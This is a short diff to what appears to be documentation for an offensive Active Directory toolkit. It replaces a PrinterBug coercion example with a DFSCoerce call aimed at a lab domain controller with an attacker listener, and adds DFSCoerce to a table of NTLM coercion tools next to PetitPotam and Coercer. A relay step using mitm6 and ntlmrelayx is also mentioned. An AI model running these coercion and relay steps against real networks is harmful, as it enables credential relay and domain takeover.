@@ -100,10 +100,10 @@ Tries:
 - MS-FSRVP
 - And more...
 
-### PrinterBug
-Specific printer coercion:
+### DFSCoerce
+DFS-based coercion (MS-DFSNM):
 ```
-printerbug(
+dfscoerce(
     target="server.contoso.local",
     listener="192.168.58.100"
 )
@@ -185,6 +185,7 @@ Combine mitm6 with ntlmrelayx to create computer account:
 |------|----------|
 | petitpotam | MS-EFSR coercion (PetitPotam) |
 | coercer | Multi-protocol coercion (tries MS-EFSR, MS-RPRN, MS-DFSNM, etc.) |
+| dfscoerce | MS-DFSNM coercion (DFSCoerce) |
 
 ### Relay Tools
 | Tool | Use Case |
